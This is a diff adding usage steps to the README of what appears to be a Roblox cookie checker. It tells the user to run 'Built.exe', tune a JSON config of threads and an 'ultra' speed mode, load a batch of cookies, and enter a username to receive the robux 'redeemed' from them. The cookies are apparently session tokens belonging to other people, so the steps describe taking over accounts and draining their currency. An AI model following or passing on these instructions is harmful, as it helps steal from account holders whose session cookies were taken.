@@ -13,6 +13,18 @@ Modes:
   - Ultra mode (Checks the cookies faster, but can cause a rate limit.)
 
 Usage:
+  - Run 'Built.exe', this will build the menu.
+  - Once done building, you have the option to modify this code (If you do not wish to, type n and press enter to skip.):
+```json
+{
+  "threads": 10,
+  "ultra": true,
+  "ultra-settings": {
+    "nodes": 1
+  },
+  "debug": false
+}
+```
   - Load the cookies by clicking the 'Load Cookies' button.
   - Start the checker by clicking the 'Start' button.
   - Once it is done checking, enter your username and it will take 5 - 10 mins for all the robux to be redeemed.
